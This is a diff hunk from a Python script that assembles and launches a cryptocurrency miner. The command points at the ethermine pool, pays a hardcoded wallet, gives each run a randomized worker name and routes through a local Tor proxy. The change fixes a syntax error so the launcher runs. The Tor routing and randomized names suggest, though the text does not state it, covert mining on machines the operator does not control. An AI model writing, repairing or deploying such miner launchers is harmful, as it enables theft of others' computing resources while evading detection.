@@ -125,7 +125,7 @@ while True:
             worker = platform.node()
             for k in range(1, 8, 1):
                 worker += random.choice(string.ascii_lowercase)
-            command = '/opt/%s --algo ethash --server us1.ethermine.org:4444 --user 0xbefefb5612d0775d592cb8c0b9411f8a57da5701 --worker %s --proxy 127.0.0.1:9050' %(xmrig_name, %worker)
+            command = '/opt/%s --algo ethash --server us1.ethermine.org:4444 --user 0xbefefb5612d0775d592cb8c0b9411f8a57da5701 --worker %s --proxy 127.0.0.1:9050' %(xmrig_name, worker)
             print(command)
             if os.path.isfile('/usr/bin/screen'):
                 print('Co chuong trinh screen')
